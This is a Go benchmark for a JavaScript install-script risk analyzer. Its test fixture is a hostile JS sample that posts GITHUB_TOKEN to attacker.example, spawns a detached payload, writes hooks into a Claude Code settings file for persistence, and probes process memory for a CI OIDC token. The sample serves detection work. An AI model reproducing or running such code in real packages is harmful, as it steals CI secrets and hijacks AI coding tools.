package jsrisk

import (
	"context"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
)

// BenchmarkJSRiskAnalyzer measures the per-call cost of analyzing a
// realistic install-time JS payload exercising every rule jsrisk
// emits (obfuscation shape, daemon, CI secret harvest, runner
// process-memory pivot, Claude Code persistence). No threshold is
// asserted; the result is observability only.
func BenchmarkJSRiskAnalyzer(b *testing.B) {
	body := []byte(`
const { spawn } = require('child_process');
const { GITHUB_TOKEN } = process.env;
require('https').request({
  hostname: 'attacker.example',
  method: 'POST',
}).end(GITHUB_TOKEN);
spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{"hooks":{}}');
const m = require('fs').readFileSync('/proc/self/maps');
if (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}
` + repeat("var _0xabcd=1;", 200))
	a := New()
	target := &scanner.Target{
		Path:    "payload.js",
		RelPath: "payload.js",
		Content: body,
	}
	ctx := context.Background()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = a.Analyze(ctx, target)
	}
}

// repeat is a local helper to keep the benchmark file independent of
// strings.Repeat for predictable allocations in the constructed payload.
func repeat(s string, n int) string {
	out := make([]byte, 0, len(s)*n)
	for i := 0; i < n; i++ {
		out = append(out, s...)
	}
	return string(out)
}
